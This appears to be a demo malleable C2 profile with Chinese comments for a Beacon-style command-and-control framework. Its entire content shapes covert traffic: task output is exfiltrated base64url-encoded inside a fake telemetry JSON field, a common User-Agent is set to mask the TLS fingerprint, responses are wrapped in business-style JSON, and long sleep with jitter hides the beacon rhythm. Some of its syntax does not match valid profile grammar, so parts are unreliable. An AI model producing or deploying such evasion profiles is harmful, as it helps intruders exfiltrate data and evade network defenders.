# C2 流量与行为定制 profile demo（研究配置，非可执行物）
# 用途：Beacon 类 C2 的 malleable 配置参考——流量特征消减四件套
http-get {
    set uri "/api/v1/telemetry";
    set verb "POST";
    client {
        # 数据外带伪装：追加到正常业务字段（jq 风格 JSON 体）
        body {
            id = "0123456789abcdef";
            metric = base64url(output);
            ts = "1699999999";
        }
        header {
            Accept = "application/json";
            # JA3 指纹面：默认 TLS 栈 + 常见 UA（与真实业务客户端一致）
            User-Agent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) MyApp/2.1";
        }
    }
    server {
        header {
            Content-Type = "application/json";
            Cache-Control = "no-store";
        }
        # 回传包裹在业务 JSON 里
        output {
            base64url;
            prepend "{\"items\":[{\"v\":\"";
            append "\"}]}";
        }
    }
}
http-post {
    set uri "/api/v1/events";
    # 心跳抖动与任务拆分（行为面）
    set verb "POST";
}
# 全局行为：长睡眠+抖动（默认 60s ±20%）；任务结果分段外带
set sleep "60";
set jitter "20";
